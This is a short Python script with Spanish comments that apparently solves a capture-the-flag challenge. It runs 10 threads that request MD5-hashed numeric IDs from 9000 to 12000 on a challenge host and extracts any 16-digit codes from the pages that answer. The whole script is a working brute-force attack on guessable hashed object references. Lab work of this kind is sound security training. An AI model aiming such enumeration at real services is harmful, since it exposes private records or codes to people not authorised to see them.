import hashlib
import requests
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import time


BASE_URL = "https://chl-5d46290d-0ebb-4498-904c-ca701cd5f551-apagar-ia.softwareseguro.com.ar/codes/"
INICIO = 9000
FIN = 12000
MAX_WORKERS = 10


def hash_md5(numero):
    return hashlib.md5(
        str(numero).encode("utf-8")
    ).hexdigest()


def consultar(numero):
    codigo_md5 = hash_md5(numero)
    url = f"{BASE_URL}{codigo_md5}/"

    try:
        response = requests.get(url, timeout=5)

        # Devolvemos también el contenido
        return (
            numero,
            codigo_md5,
            url,
            response.status_code,
            response.text
        )

    except requests.RequestException as e:
        return (
            numero,
            codigo_md5,
            url,
            "ERROR",
            str(e)
        )


tiempo_inicio = time.time()

total = FIN - INICIO + 1
procesados = 0
encontrados = 0
errores = 0
soluciones = []


with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:

    futures = [
        executor.submit(consultar, i)
        for i in range(INICIO, FIN + 1)
    ]

    for future in as_completed(futures):

        numero, md5, url, status, contenido = future.result()

        procesados += 1

        if status == 200:

            encontrados += 1

            # Busca exactamente 16 dígitos consecutivos
            numeros_16 = re.findall(
                r'(?<!\d)\d{16}(?!\d)',
                contenido
            )

            if numeros_16:

                for solucion in numeros_16:

                    soluciones.append(
                        (numero, solucion, url)
                    )

                    print("\n\n🎯 POSIBLE SOLUCIÓN ENCONTRADA")
                    print("==============================")
                    print("Número probado:", numero)
                    print("MD5:", md5)
                    print("Código de 16 dígitos:", solucion)
                    print("URL:", url)
                    print("Response completa:")
                    print(contenido)
                    print("==============================")


        elif status == "ERROR":
            errores += 1


        # PROGRESO
        if procesados % 100 == 0 or procesados == total:

            transcurrido = time.time() - tiempo_inicio

            velocidad = procesados / transcurrido

            restantes = total - procesados

            segundos_restantes = (
                restantes / velocidad
                if velocidad > 0
                else 0
            )

            porcentaje = (procesados / total) * 100

            print(
                f"\r"
                f"⏳ {procesados}/{total} "
                f"({porcentaje:.1f}%) | "
                f"⚡ {velocidad:.1f} req/s | "
                f"ETA: {segundos_restantes / 60:.1f} min | "
                f"🎯 {len(soluciones)} soluciones",
                end="",
                flush=True
            )


# ==========================
# RESULTADO FINAL
# ==========================

tiempo_total = time.time() - tiempo_inicio

print("\n\n==============================")
print("🏁 PROCESO TERMINADO")
print("==============================")

print(f"Consultas realizadas: {procesados}")
print(f"Responses 200: {encontrados}")
print(f"Errores: {errores}")
print(f"Tiempo: {tiempo_total / 60:.2f} minutos")


if soluciones:

    print("\n🎯 CÓDIGOS DE 16 DÍGITOS ENCONTRADOS:")

    for numero, solucion, url in soluciones:
        print()
        print(f"Número probado: {numero}")
        print(f"Solución: {solucion}")
        print(f"URL: {url}")

else:
    print("\n❌ No se encontró ningún número de 16 dígitos.")